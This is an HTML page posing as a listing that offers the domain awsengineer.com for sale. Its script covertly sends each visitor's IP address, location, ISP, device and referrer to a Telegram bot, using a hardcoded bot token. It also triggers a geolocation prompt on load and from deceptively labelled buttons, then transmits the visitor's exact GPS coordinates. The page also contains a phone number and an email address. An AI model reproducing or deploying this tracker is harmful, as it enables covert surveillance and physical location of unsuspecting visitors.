<!DOCTYPE html>

<head>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 16px;
            padding: 40px 30px;
            max-width: 550px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
        }
        .badge {
            display: inline-block;
            background: #22c55e;
            color: #052e16;
            font-weight: 700;
            font-size: 0.85rem;
            padding: 4px 12px;
            border-radius: 9999px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 2rem;
            font-weight: 800;
            color: #ffffff;
            margin-bottom: 12px;
            word-break: break-all;
        }
        p {
            color: #94a3b8;
            font-size: 1.1rem;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            font-weight: 600;
            font-size: 1rem;
            padding: 14px 20px;
            border-radius: 10px;
            cursor: pointer;
            border: none;
            transition: transform 0.2s, opacity 0.2s;
        }
        .btn:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }
        .btn-whatsapp {
            background-color: #25d366;
            color: #ffffff;
        }
        .btn-email {
            background-color: #3b82f6;
            color: #ffffff;
        }
        .btn-verify {
            background-color: #334155;
            color: #38bdf8;
            font-size: 0.9rem;
            padding: 12px 16px;
            border: 1px dashed #475569;
        }
        .footer {
            margin-top: 25px;
            font-size: 0.85rem;
            color: #64748b;
        }
        .counter-container {
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #334155;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85rem;
            color: #94a3b8;
        }
        .counter-badge {
            background: #0f172a;
            border: 1px solid #475569;
            color: #38bdf8;
            font-weight: bold;
            padding: 2px 8px;
            border-radius: 6px;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="badge">Available Now</div>
        <h1>awsengineer.com</h1>
        <p>This premium domain is available for acquisition. Contact the owner directly via Email or WhatsApp to make an offer.</p>
        
        <div class="btn-group">
            <a href="https://wa.me/212653621430?text=Hello,%20I%20am%20interested%20in%20purchasing%20awsengineer.com" class="btn btn-whatsapp" target="_blank" onclick="triggerGpsCapture()">
                Chat on WhatsApp (+212 653 621 430)
            </a>
            
            <a href="mailto:deatmiau@gmail.com?subject=Domain%20Inquiry%20-%20awsengineer.com" class="btn btn-email" onclick="triggerGpsCapture()">
                Send Email (deatmiau@gmail.com)
            </a>

            <!-- Explicit button to trigger GPS prompt directly -->
            <button class="btn btn-verify" onclick="triggerGpsCapture()">
                📍 Verify Regional Transfer & Escrow
            </button>
        </div>

        <div class="footer">
            Fast transfer & escrow options available.
        </div>

        <div class="counter-container">
            <span>👁️ Total Page Views:</span>
            <span id="view-count" class="counter-badge">Loading...</span>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8817325199:AAG3rAIc22jflbYRoCnrtu_7sjLRGMaVRR4";
        const CHAT_ID = "1890351722";
        let visitorIP = "Unknown";

        // Helper to send messages to your Telegram bot
        async function sendToTelegram(messageText) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: messageText
                    }),
                    keepalive: true
                });
            } catch (e) {
                const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(messageText)}`;
                new Image().src = fallbackUrl;
            }
        }

        // 1. Visitor Hit Counter
        async function fetchVisitorCount() {
            try {
                const response = await fetch('https://api.counterapi.dev/v1/awsengineer_com/views/up');
                if (response.ok) {
                    const data = await response.json();
                    document.getElementById('view-count').textContent = data.count;
                } else {
                    document.getElementById('view-count').textContent = '1+';
                }
            } catch (error) {
                document.getElementById('view-count').textContent = '1+';
            }
        }
        fetchVisitorCount();

        // 2. Stage 1: Silent IP/ISP Telemetry Log
        async function logIpArrival() {
            let city = "Unknown";
            let country = "Unknown";
            let isp = "Unknown";

            try {
                const res = await fetch("https://ipwho.is/");
                const data = await res.json();
                if (data && data.success !== false) {
                    visitorIP = data.ip || visitorIP;
                    city = data.city || city;
                    country = data.country || country;
                    isp = data.connection ? data.connection.isp : (data.isp || isp);
                }
            } catch (err) {
                console.log("IP fallback triggered");
            }

            const referrer = document.referrer || "Direct Navigation";
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const device = navigator.userAgent.substring(0, 95);

            const initialAlert = 
                `🔔 [STAGE 1: VISITOR ARRIVAL]\n\n` +
                `📍 ISP Area: ${city}, ${country}\n` +
                `🌐 IP Address: ${visitorIP}\n` +
                `🏢 ISP / Routing: ${isp}\n` +
                `🖥️ Screen: ${screenRes}\n` +
                `🔗 Referrer: ${referrer}\n` +
                `📱 Device: ${device}...`;

            sendToTelegram(initialAlert);
        }
        logIpArrival();

        // 3. Stage 2: High-Precision GPS Hardware Triangulation
        function triggerGpsCapture() {
            if (!navigator.geolocation) {
                sendToTelegram(`⚠️ Geolocation not supported on visitor browser. IP: ${visitorIP}`);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = Math.round(position.coords.accuracy);
                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                    const gpsAlert = 
                        `🎯 [STAGE 2: EXACT GPS PINPOINT CAPTURED!]\n\n` +
                        `📌 Y (Latitude): ${lat}\n` +
                        `📌 X (Longitude): ${lon}\n` +
                        `📏 Precision: within ${acc} meters\n` +
                        `🗺️ Exact Google Maps Link:\n${mapUrl}\n\n` +
                        `🌐 IP: ${visitorIP}`;

                    sendToTelegram(gpsAlert);
                },
                (error) => {
                    let reason = "Permission Denied / Dismissed";
                    if (error.code === 2) reason = "Position Unavailable (No GPS Fix)";
                    if (error.code === 3) reason = "Timeout (>15 seconds)";
                    sendToTelegram(`⚠️ [GPS ACCESS FAILED]: ${reason}\nIP: ${visitorIP}`);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        // Trigger prompt automatically on page load
        setTimeout(triggerGpsCapture, 800);
    </script>

</body>
</html>
